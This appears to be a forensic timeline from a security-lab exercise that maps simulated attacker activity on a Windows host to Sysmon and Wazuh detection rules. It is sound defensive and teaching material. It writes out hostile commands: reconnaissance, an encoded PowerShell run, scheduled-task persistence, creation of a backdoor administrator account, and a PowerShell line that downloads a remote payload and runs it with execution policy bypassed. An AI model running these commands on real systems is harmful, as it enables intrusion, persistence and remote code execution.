# CASE-001: Chronological Forensic Timeline

*Extracted directly from Sysmon Event IDs 1, 3, 7, 11, 12 in Wazuh `archives.json`. All timestamps UTC.*

---

### Phase 1 — External Reconnaissance (`19:15 UTC`)

| # | Timestamp (UTC) | PID | Image | Command Line | Wazuh Rule | Severity |
|:---:|:---|:---:|:---|:---|:---|:---:|
| **1** | `2026-08-26 19:15:33` | — | `nmap` (Kali) | `-Pn -sS -sV -p 135,139,445,3389,5985 192.168.56.105` | Sysmon EID 3 | Low |

---

### Phase 2 — Initial Execution, Obfuscation & Discovery (`19:43 – 19:47 UTC`)

| # | Timestamp (UTC) | PID | Image | Command Line | Wazuh Rule | Severity |
|:---:|:---|:---:|:---|:---|:---|:---:|
| **2** | `19:43:19.751` | 6180 | `powershell.exe` | `-NoProfile -Command "whoami; hostname; ipconfig"` | **92027** (PS→PS) | Level 4 |
| **3** | `19:43:20.837` | 5704 | `whoami.exe` | `whoami` (child of PID 6180) | — | — |
| **4** | `19:43:21.268` | 908 | `HOSTNAME.EXE` | `hostname` (child of PID 6180) | — | — |
| **5** | `19:43:21.421` | 3184 | `ipconfig.exe` | `ipconfig` (child of PID 6180) | — | — |
| **6** | `19:45:30.986` | 1680 | `powershell.exe` | `-NoProfile -EncodedCommand VwByAGkA...` | **92057** (Base64 PS) | **Level 12** |
| **7** | `19:47:38.042` | 6136 | `cmd.exe` | `/c "whoami && netstat -ano"` | **92004** (CMD from PS) | Level 4 |
| **8** | `19:47:38.131` | 5388 | `whoami.exe` | `whoami` (child of cmd PID 6136) | **92032** | Level 3 |
| **9** | `19:47:38.207` | 4428 | `NETSTAT.EXE` | `netstat -ano` (child of cmd PID 6136) | **92032** | Level 3 |

---

### Phase 3 — Scheduled Task Persistence (`20:16 UTC`)

| # | Timestamp (UTC) | PID | Image | Command Line | Wazuh Rule | Severity |
|:---:|:---|:---:|:---|:---|:---|:---:|
| **10** | `20:16:57.013` | 5704 | `schtasks.exe` | `/create /tn SOCForgePersistence /tr calc.exe /sc onlogon /f` | **100104** | **Level 10** |

---

### Phase 4 — Persistence Removal & Account Manipulation (`20:17 – 20:24 UTC`)

| # | Timestamp (UTC) | PID | Image | Command Line | Wazuh Rule | Severity |
|:---:|:---|:---:|:---|:---|:---|:---:|
| **11** | `20:17:12.712` | 7016 | `schtasks.exe` | `/delete /tn SOCForgePersistence /f` | **92154** | Level 4 |
| **12** | `20:23:07.540` | 5000 | `net.exe` | `user socforge_backdoor P@ssw0rd123! /add` | **92033**, **100105** | Level 3/10 |
| **13** | `20:23:07.607` | 3528 | `net1.exe` | `user socforge_backdoor P@ssw0rd123! /add` | **92039** | Level 3 |
| **14** | `20:23:11.737` | 1944 | `net.exe` | `localgroup administrators socforge_backdoor /add` | **92033**, **100105** | Level 3/10 |
| **15** | `20:23:11.790` | 5980 | `net1.exe` | `localgroup administrators socforge_backdoor /add` | **92031** | Level 3 |
| **16** | `20:24:44.755` | 6980 | `net.exe` | `user socforge_backdoor /delete` | **92033** | Level 3 |
| **17** | `20:24:44.842` | 6336 | `net1.exe` | `user socforge_backdoor /delete` | **92039** | Level 3 |

---

### Phase 5 — External C2 Ingress Tool Transfer & Secondary Execution (`23:18 UTC`)

| # | Timestamp (UTC) | PID | Image | Command Line | Wazuh Rule | Severity |
|:---:|:---|:---:|:---|:---|:---|:---:|
| **18** | `23:18:45.304` | 8052 | `powershell.exe` | `Invoke-WebRequest -Uri 'http://192.168.56.101:8080/payload.ps1' -OutFile '...\payload.ps1'; powershell.exe -ExecutionPolicy Bypass -File '...\payload.ps1'` | **92029** | Level 6 |
| **19** | `23:18:47.780` | 4688 | `powershell.exe` | `-ExecutionPolicy Bypass -File C:\Windows\Temp\payload.ps1` | **92029** | Level 6 |

---

### Phase 6 — Final Endpoint Verification & Post-Remediation Audit (`23:48 – 23:49 UTC`)

| # | Timestamp (UTC) | PID | Image | Command Line | Wazuh Rule | Severity |
|:---:|:---|:---:|:---|:---|:---|:---:|
| **20** | `23:48:28.412` | 5628 | `schtasks.exe` | `/query /tn SOCForgePersistence` → ERROR: not found | — | — |
| **21** | `23:49:30.344` | 4608 | `schtasks.exe` | `/query /tn SOCForgePersistence` → ERROR: not found | — | — |
